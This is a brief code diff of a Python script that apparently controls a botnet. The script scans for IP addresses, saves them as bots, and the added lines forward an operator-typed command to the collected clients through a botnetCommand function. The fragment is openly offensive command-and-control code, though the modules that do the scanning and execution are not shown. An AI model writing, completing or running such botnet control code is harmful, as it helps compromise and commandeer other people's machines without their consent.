@@ -9,6 +9,7 @@ from rwList import RW
 from command import Command
 import argparse
 
+
 listip = Scanbot.scan()
 
 Scanbot.display_result(listip)
@@ -16,5 +17,5 @@ Scanbot.display_result(listip)
 RW.saveBot(listip)
 
 order = input("Command:")
-
-   
+botNet = Command.addClient
+Command.botnetCommand(order,botNet)  
